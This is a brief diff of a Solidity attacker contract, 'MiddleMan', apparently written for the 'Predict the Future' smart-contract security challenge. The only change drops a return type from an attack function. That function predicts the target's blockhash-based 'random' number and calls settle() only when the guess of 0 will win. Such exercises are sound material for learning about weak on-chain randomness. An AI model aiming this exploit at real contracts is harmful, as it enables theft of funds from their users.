@@ -8,7 +8,7 @@ contract MiddleMan {
         PredictTheFuture(prey).lockInGuess(0);
     }
 
-    function attack(address prey) public returns (bool) {
+    function attack(address prey) public {
         if (0 == uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10)) {
             PredictTheFuture(prey).settle();
         }
